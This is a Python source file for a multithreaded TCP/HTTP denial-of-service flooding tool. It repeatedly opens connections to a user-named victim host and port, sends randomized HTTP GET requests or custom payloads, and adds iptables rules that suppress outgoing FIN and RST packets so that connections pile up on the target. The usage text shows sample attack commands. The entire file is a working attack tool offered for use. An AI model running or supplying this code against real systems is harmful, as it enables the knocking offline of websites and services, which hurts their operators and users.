import argparse
import random
import signal
import socket
import ssl
import string
import sys
from os import geteuid, system
from threading import Thread, active_count
from time import sleep

example_text = ''' \nTips: Target page with 1500+ bytes size.
example:
  python {} example.com/test.php -p 80 -http
  python {} example.com/hello/ -p 443 -ssl -http
  python {} example.com -p 80 -http 
  python {} example.com -p 21 -payload 68656c6c6f
  python {} example.com -p 22
Connects - TCP handshakes towards victim
Payloads - Recevied payloads by victim
Dropped  - TCP handshakes or payloads rejected by victim (site down)
 
'''.format(sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

parser = argparse.ArgumentParser(
    epilog=example_text, formatter_class=argparse.RawTextHelpFormatter)
parser._action_groups.pop()
required = parser.add_argument_group('required arguments')
optional = parser.add_argument_group('optional arguments')

required.add_argument('target', help='Specify a target to attack')
required.add_argument(
    '-p', dest='port', help='Specify port to attack', type=int, required=True)
optional.add_argument('-t', dest='THREADS', type=int,
                      default=300, help='Threads, default = 300 threads')
optional.add_argument('-ssl', action='store_true',  help='Enable SSL')
optional.add_argument('-http', action='store_true',
                      help='Enable HTTP headers (only if custom payload not set)')
optional.add_argument('-payload', help='Set payload as hex-string')


args = parser.parse_args()
connected = 0
dropped = 0
payloads = 0
port = args.port

# Sort out http URI in targets
target = args.target.replace('http://', '').replace('https://', '')

if '/' in target and args.http:
    path = target[target.find('/'):]
    target = target[:target.find('/')]
else:
    path = '/'


# Decode custom payload
try:
    if args.payload:
        payload = args.payload.decode('hex')
    else:
        payload = ''
except:
    print('Use hex string format as payload.')
    sys.exit()


# Check root
if geteuid() != 0:
    print(f'Run {sys.argv[0]} as root.')
    sys.exit()


stop = False
def signal_handler(signal, frame):
    global stop
    stop = True
signal.signal(signal.SIGINT, signal_handler)


def string_generator(size=random.randint(3, 8), chars=string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(chars) for _ in range(size))


# Generate HTTP Payload
def http_payload():
    payload = 'GET {}?{} HTTP/1.1\r\n'.format(path, string_generator())
    payload += 'Host: {}\r\n'.format(target)
    payload += 'User-Agent: mrrobot\r\n'
    payload += 'Connection: keep-alive\r\n\r\n'
    return payload


# DOS function
def flood(target_ip, payload):
    global connected, dropped, payloads
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(2)
        try:
            s.connect((target_ip, port))
            connected += 1
            if args.ssl:
                s = ssl.wrap_socket(s, cert_reqs=ssl.CERT_NONE)
            if args.http and not args.payload:
                payload = http_payload()
            s.send(payload)
            payloads += 1
            s.close()
        except:
            dropped += 1
        if stop == True:
            break


if __name__ == '__main__':
    target_ip = socket.gethostbyname(target)
    # add IP tables to drop FIN and RST packets towards TARGET
    system('iptables -A OUTPUT -d {} -p tcp --dport {} --tcp-flags FIN FIN -j DROP'.format(target_ip, port))
    system('iptables -A OUTPUT -d {} -p tcp --dport {} --tcp-flags RST RST -j DROP'.format(target_ip, port))

    threads = []
    for i in range(args.THREADS):
        t = Thread(target=flood, args=(target_ip, payload,))
        threads.append(t)
        t.start()

    while True:
        if active_count() == 1 or stop == True:
            # ctrl+c -> restore IP tables.
            system(
                'iptables -D OUTPUT -d {} -p tcp --dport {} --tcp-flags FIN FIN -j DROP'.format(target_ip, port))
            system(
                'iptables -D OUTPUT -d {} -p tcp --dport {} --tcp-flags RST RST -j DROP'.format(target_ip, port))
            print()
            break
        else:
            sleep(0.1)
            sys.stdout.write(
                f'Connects: {connected}, Payloads: {payloads}, Dropped: {dropped}                   \r')
            sys.stdout.flush()
